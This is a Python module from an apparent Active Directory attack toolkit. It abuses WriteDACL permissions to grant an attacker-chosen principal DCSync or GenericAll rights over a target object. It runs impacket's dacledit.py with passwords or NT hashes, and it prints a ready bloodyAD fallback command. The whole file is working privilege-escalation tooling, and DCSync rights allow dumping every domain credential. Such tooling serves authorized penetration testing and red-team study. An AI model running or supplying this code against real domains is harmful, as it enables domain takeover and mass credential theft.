"""WriteDACL abuse — grant DCSync/GenericAll rights when holding WriteDACL."""
from __future__ import annotations
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.writedacl_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "dacl_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1222.001"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_dn = getattr(args, "target_dn", None)
    principal = getattr(args, "principal", cred.username)
    escalation = getattr(args, "escalation", "dcsync")
    dc_ip = getattr(args, "dc_ip", args.target)

    if not target_dn:
        print("[!] --target-dn required (e.g., domain DN for DCSync)", file=sys.stderr)
        return 1

    print("[*] WriteDACL abuse: grant {} to {} on {}".format(escalation, principal, target_dn))

    if shutil.which("dacledit.py"):
        cmd = [
            "dacledit.py",
            "-action", "write",
            "-rights", escalation.upper(),
            "-principal", principal,
            "-target-dn", target_dn,
            "-dc-ip", dc_ip,
            "{}\\{}".format(args.domain, cred.username),
        ]
        if cred.has_hash:
            cmd.extend(["-hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])

        print("[*] {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr, file=sys.stderr)
        return result.returncode

    print("[!] dacledit.py not found — manual LDAP DACL write needed", file=sys.stderr)
    print("[*] Alternative: bloodyAD --host {} -d {} -u {} -p {} add genericAll {} {}".format(
        dc_ip, args.domain, cred.username, cred.password or "<hash>", target_dn, principal))
    return 1
